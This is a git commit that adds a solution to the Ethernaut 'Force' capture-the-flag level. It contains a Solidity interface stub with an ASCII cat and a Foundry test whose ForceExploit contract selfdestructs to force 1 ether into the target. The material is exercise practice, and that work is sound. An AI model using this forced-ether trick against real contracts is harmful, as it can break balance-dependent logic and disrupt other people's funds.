3038d2696e41e780911aab062a79dc049fc65f31
Keshav Mundhra <mundhrakeshav11@gmail.com>
2023-04-13 21:48:17 +0530

    Force

---
+++ src/CTFs/ethernaut/7Force.sol
@@ -0,0 +1,14 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+
+// Can be resolved by selfdestruct
+interface IForce {
+/*
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+*/
+}
---
+++ test/CTFs/ethernaut/Force.t.sol
@@ -0,0 +1,51 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.17;
+
+import {IForce} from "ethernaut/7Force.sol";
+import {BaseTest} from "./BaseTest.t.sol";
+
+contract ForceExploit {
+    address payable force;
+
+    constructor(address payable _force) payable {
+        force = _force;
+    }
+
+
+    function exploit() public {
+        assembly {
+            selfdestruct(sload(force.slot))
+        }
+    }
+    receive() external payable {
+        
+    }
+}
+contract ForceTest is BaseTest {
+    IForce public forceInstance = IForce(0x85115E3Bb9739dfDb3629e8f0539e1d013BF7678);
+
+    function setUp() public override {
+        super.setUp();
+    }
+
+    function exploitSol() internal override {
+        ForceExploit forceExploit = new ForceExploit(payable(address(forceInstance)));
+        address(forceExploit).call{value: 1 ether}("");
+        forceExploit.exploit();
+    }
+
+    function testExploitSol() public override {
+        exploitSol();
+        assertEq(address(forceInstance).balance, 1 ether);
+    }
+
+    function exploitYul() internal override {   
+    }
+
+    function testExploitYul() public override {
+        exploitYul();
+    }
+    function testExploitYulW() public {
+        exploitYul();
+    }
+}
